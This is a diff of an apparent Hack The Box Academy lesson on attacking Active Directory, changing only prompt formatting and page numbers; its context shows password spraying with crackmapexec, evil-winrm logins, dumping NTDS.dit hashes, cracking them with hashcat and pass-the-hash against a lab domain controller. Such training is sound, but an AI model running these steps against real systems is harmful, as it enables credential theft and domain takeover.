@@ -8,12 +8,12 @@
 // Section ID: 1326
 // Section Title: Attacking Active Directory & NTDS.dit
 // Page Title: Hack The Box - Academy
-// Page Number: 9
+// Page Number: 09
 -->
 
 # Attacking Active Directory & NTDS.dit
 
-**Module Name:** Password Attacks **Page Number:** 9
+**Module Name:** Password Attacks **Page Number:** 09
 
 #### 
 
@@ -28,7 +28,7 @@
 #### Creating a Custom list of Usernames
 
 ``` shell-session
-ndefstathiou@htb[/htb]$ cat usernames.txt 
+[!bash!]$ cat usernames.txt 
 bwilliamson
 benwilliamson
 ben.willamson
@@ -44,7 +44,7 @@ stevenson.jim
 ```
 
 ``` shell-session
-ndefstathiou@htb[/htb]$ ./username-anarchy -i /home/ltnbob/names.txt 
+[!bash!]$ ./username-anarchy -i /home/ltnbob/names.txt 
 
 ben
 benwilliamson
@@ -123,7 +123,7 @@ jd
 #### Launching the Attack with CrackMapExec
 
 ``` shell-session
-ndefstathiou@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
+[!bash!]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
 
 SMB         10.129.201.57     445    DC01           [*] Windows 10.0 Build 17763 x64 (name:DC-PAC) (domain:dac.local) (signing:True) (SMBv1:False)
 SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2017 STATUS_LOGON_FAILURE 
@@ -145,7 +145,7 @@ SMB         10.129.201.57     445    DC01             [+] inlanefrieght.local\bw
 #### Connecting to a DC with Evil-WinRM
 
 ``` shell-session
-ndefstathiou@htb[/htb]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
+[!bash!]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
 ```
 
 #### Checking Local Group Membership
@@ -256,7 +256,7 @@ Successfully created shadow copy for 'C:\'
 #### A Faster Method: Using cme to Capture NTDS.dit
 
 ``` shell-session
-ndefstathiou@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
+[!bash!]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
 
 SMB         10.129.201.57    445     DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefrieght.local) (signing:True) (SMBv1:False)
 SMB         10.129.201.57    445     DC01             [+] inlanefrieght.local\bwilliamson:P@55w0rd! (Pwn3d!)
@@ -299,7 +299,7 @@ SMB         10.129.201.57    445     DC01           WIN-IAUBULPG5MZ:aes128-cts-h
 #### Cracking a Single Hash with Hashcat
 
 ``` shell-session
-ndefstathiou@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
+[!bash!]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
 
 64f12cddaa88057e06a81b54e73b949b:Password1
 ```
@@ -309,7 +309,7 @@ ndefstathiou@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /u
 #### Pass-the-Hash with Evil-WinRM Example
 
 ``` shell-session
-ndefstathiou@htb[/htb]$ evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
+[!bash!]$ evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
 ```
 
 # 
